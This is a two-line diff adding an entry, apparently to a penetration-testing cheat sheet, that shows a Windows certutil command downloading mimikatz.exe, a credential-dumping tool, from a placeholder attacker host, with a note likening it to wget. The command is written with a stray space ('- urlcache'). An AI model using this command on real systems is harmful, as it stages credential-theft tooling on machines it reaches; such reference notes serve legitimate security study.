@@ -1,0 +1,2 @@
+- __`certutil - urlcache -f http://<attacker>/mimikatz.exe mimikatz.exe`__
+  - __It allows download files form the webserver, Same like wget in linux__
